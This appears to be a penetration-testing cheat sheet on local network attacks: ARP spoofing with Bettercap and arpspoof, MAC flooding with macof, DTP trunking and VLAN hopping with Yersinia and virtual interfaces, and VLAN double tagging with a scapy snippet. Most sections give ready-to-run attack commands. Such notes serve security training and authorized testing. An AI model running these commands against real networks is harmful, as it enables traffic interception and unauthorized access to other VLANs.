# LAN Attacks

## ARP Spoofing

  - ARP spoofing consist on sending gratuitous ARPResponses to indicate that the IP of a machine has the MAC of our device. Then, the victim will change the ARP table and will contact our machine every time it wants to contact the IP spoofed.
  
### Bettercap2

 ``` 
  arp.spoof on
  arp.ban on # No ipv4-redirect
  arp.spoof.targets
  arp.spoof.whitelist
  arp.spoof.internal #Spoofed local connections (by default only Victim <--> Gateway )
  
  ```

### Arpspoof

  ``` 
  echo 1 > /proc/sys/net/ipv4/ip_forward
  arpspoof -t 192.168.1.1 192.168.1.2
  arpspoof -t 192.168.1.2 192.168.1.1
  ```

### MAC Flooding - CAM overflow

  - Overflow the switch's CAM table sending a lot of packets with different source mac address. When the CAM table is full the switch starts behaving like a hub(broadcasting all the traffic)
  
  `macof -i <interface>`

  - In modern switches this vulnerability has been fixed


### 802.1Q VLAN

Dynamic Trunking

  - Many switches support the Dynamic Trunking Protocol (DTP) by default, however, which an adversary can abuse to emulate a switch and receive traffic across all VLANs. The tool dtpscan.sh can sniff an interface and reports if switch is in Default mode, trunk, dynamic, auto or access mode (this is the only one that would avoid VLAN hopping). The tool will indicate if the switch is vulnerable or not.
  
  - If it was discovered that the the network is vulnerable, you can use Yersinia to launch an "enable trunking" using protocol "DTP" and you will be able to see network packets from all the VLANs.
    
```
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode


```

### Attacking Specific VLANs 

- Once you know VLAN IDs and IPs values, you can configure a virutal interface to attack a specific VLAN.

- If DHCP is not available, then use *ifconfig* to set a static IP address

```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
          inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24

```

```
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

### Automatic VLAN Hopper

  - The attack of Dynamic Trunking and creating virtual interfaces and discovering hosts inside other VLANs are automatically performed by the tool: [VLAN Hopper - Github Repo](https://github.com/nccgroup/vlan-hopping---frogger)

Double Tagging

  - If an attacker knows the value of the **MAC**, **IP** and **VLAN ID** of the victim host, he could try to double tag a frame with its designated VLAN and the VLAN of the victim and send a packet. As the victim won't be able to connect back with the attacker, so the best option for the attacker is communicate via **UDP** to protocols that can perform some interesting actions (like **SNMP**).
    
  - Another option for the attacker is to launch a **TCP port scan** spoofing an IP controlled by the attacker and accessible by the victim (probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.
  
   - https://1517081779-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FHHYuR9d580W7O081ip6n%2Fimage.png?alt=media&token=b293aa52-b32c-407c-a5fb-a6cde8cca7ad
  
 - To perform this attack you could use scapy: `pip install scapy`
  
 ```
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
 ```

### 
